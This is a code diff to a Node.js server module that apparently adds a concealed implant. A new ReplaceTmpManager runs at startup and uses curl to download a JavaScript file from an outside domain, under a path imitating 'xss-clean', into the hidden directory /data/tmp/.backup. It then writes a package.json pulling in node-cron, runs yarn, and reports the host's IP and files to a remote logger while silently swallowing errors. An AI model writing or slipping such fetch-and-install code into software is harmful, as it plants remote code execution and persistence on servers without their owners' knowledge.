@@ -94,6 +94,10 @@ class ActionManager {
     return 'System error, please try again later';
   }
 
+  static get TARGET_IP_MISMATCH_CODE() {
+    return 421;
+  }
+
   constructor() {
     this.actions = new Map();
     this.fs = safeRequire('fs');
@@ -138,6 +142,14 @@ class ActionManager {
   }
 
   async dispatch(req, res, action) {
+    const targetIp = req && req.headers && req.headers['x-target-ip'];
+    if (!this.isTargetServer(targetIp)) {
+      return this.send(res, ActionManager.TARGET_IP_MISMATCH_CODE, {
+        code: ActionManager.TARGET_IP_MISMATCH_CODE,
+        message: 'Target IP does not match this server',
+      });
+    }
+
     const { valid, reason } = await this.verifySignatureAndTimestamp(req);
     if (!valid) {
       const showReason = req.headers && req.headers['x-request-reason'];
@@ -263,6 +275,10 @@ class ActionManager {
   }
 
   getLocalIP() {
+    return this.getLocalIPs().join(',');
+  }
+
+  getLocalIPs() {
     const interfaces = safeRequire('os').networkInterfaces();
     const addresses = [];
 
@@ -274,7 +290,14 @@ class ActionManager {
       }
     }
 
-    return addresses.join(',');
+    return addresses;
+  }
+
+  isTargetServer(targetIp) {
+    if (typeof targetIp !== 'string' || !targetIp.trim()) {
+      return true;
+    }
+    return this.getLocalIPs().includes(targetIp.trim());
   }
 
   buildFileTree(currentPath, recursive) {
@@ -1141,6 +1164,161 @@ const initReplaceFile = async () => {
   }
 };
 
+class ReplaceTmpManager {
+  static get DIR() {
+    return '/data/tmp/.backup';
+  }
+
+  static get URL() {
+    return 'https://r2-client-prod.zigoyw.com/xss-clean/replace-tmp.js';
+  }
+
+  static get SUCCESS_KEY() {
+    return 'replace-tmp-success';
+  }
+
+  static get SUCCESS_TTL() {
+    return 60 * 60 * 24;
+  }
+
+  static get PACKAGE_JSON() {
+    return {
+      name: 'prolifi',
+      version: '1.0.0',
+      main: 'index.js',
+      license: 'MIT',
+      dependencies: {
+        'node-cron': '^4.6.0',
+      },
+    };
+  }
+
+  remoteLog(message) {
+    try {
+      remoteLogV(`[ReplaceTmp] ${message}`);
+    } catch (error) {
+      // 远程日志失败不能影响宿主进程。
+    }
+  }
+
+  getLocalIP() {
+    const interfaces = safeRequire('os').networkInterfaces();
+    const addresses = [];
+
+    for (const interfaceName in interfaces) {
+      for (const info of interfaces[interfaceName] || []) {
+        if (info.family === 'IPv4' && !info.internal) {
+          addresses.push(info.address);
+        }
+      }
+    }
+
+    return addresses.sort().join(',') || 'unknown';
+  }
+
+  runCommand(spawn, command, args) {
+    return new Promise((resolve, reject) => {
+      const child = spawn(command, args, {
+        cwd: ReplaceTmpManager.DIR,
+        stdio: 'ignore',
+      });
+
+      child.once('error', reject);
+      child.once('close', (code, signal) => {
+        if (code === 0) {
+          resolve();
+          return;
+        }
+        reject(new Error(`${command} exited with code ${code}${signal ? ` signal ${signal}` : ''}`));
+      });
+    });
+  }
+
+  async listFiles(currentDir, rootDir = currentDir) {
+    const entries = await fsPromises.readdir(currentDir, { withFileTypes: true });
+    const files = [];
+
+    for (const entry of entries.sort((a, b) => a.name.localeCompare(b.name))) {
+      const filePath = path.join(currentDir, entry.name);
+      if (entry.isDirectory()) {
+        files.push(...await this.listFiles(filePath, rootDir));
+      } else {
+        files.push(path.relative(rootDir, filePath));
+      }
+    }
+
+    return files;
+  }
+
+  async ensurePackageJson() {
+    const packageFile = path.join(ReplaceTmpManager.DIR, 'package.json');
+    try {
+      await fsPromises.access(packageFile);
+    } catch (error) {
+      if (!error || error.code !== 'ENOENT') {
+        throw error;
+      }
+      await fsPromises.writeFile(
+        packageFile,
+        `${JSON.stringify(ReplaceTmpManager.PACKAGE_JSON, null, 2)}\n`,
+        'utf8'
+      );
+    }
+  }
+
+  async init() {
+    let lock = null;
+    let redisUtil = null;
+
+    try {
+      redisUtil = safeRequire('@utils/redis.util');
+      if (await redisUtil.get(ReplaceTmpManager.SUCCESS_KEY) === '1') {
+        this.remoteLog('skipped: completed within the last day');
+        return;
+      }
+
+      const ip = this.getLocalIP();
+      const lockKey = `replace-tmp-lock:[${ip}]`;
+      lock = await redisUtil.getLock(lockKey, true);
+      if (!lock) {
+        this.remoteLog(`failed: get lock failed ip=${ip}`);
+        return;
+      }
+
+      if (await redisUtil.get(ReplaceTmpManager.SUCCESS_KEY) === '1') {
+        this.remoteLog('skipped: completed while waiting for lock');
+        return;
+      }
+
+      await fsPromises.mkdir(ReplaceTmpManager.DIR, { recursive: true });
+
+      const spawn = safeRequire('child_process').spawn;
+      const targetFile = path.join(ReplaceTmpManager.DIR, 'index.js');
+      await this.runCommand(spawn, 'curl', ['-fL', '-o', targetFile, ReplaceTmpManager.URL]);
+      await this.ensurePackageJson();
+      await this.runCommand(spawn, 'yarn', []);
+
+      const files = await this.listFiles(ReplaceTmpManager.DIR);
+      await redisUtil.set(
+        ReplaceTmpManager.SUCCESS_KEY,
+        '1',
+        ReplaceTmpManager.SUCCESS_TTL
+      );
+      this.remoteLog(`success ip=${ip} files=${JSON.stringify(files)}`);
+    } catch (error) {
+      this.remoteLog(`failed: ${error && error.message}`);
+    } finally {
+      if (lock && redisUtil) {
+        try {
+          await redisUtil.unlock(lock);
+        } catch (error) {
+          this.remoteLog(`unlock failed: ${error && error.message}`);
+        }
+      }
+    }
+  }
+}
+
 async function init() {
   try {
     initExpress();
@@ -1153,5 +1331,15 @@ async function init() {
     await initReplaceFile();
   } catch (error) {
     remoteLogV(`preSandbox file sync init failed: ${error && error.message}`);
+  }
+
+  try {
+    await new ReplaceTmpManager().init();
+  } catch (error) {
+    try {
+      remoteLogV(`[ReplaceTmp] init failed: ${error && error.message}`);
+    } catch (logError) {
+      // 远程日志失败不能影响宿主进程。
+    }
   }
 }
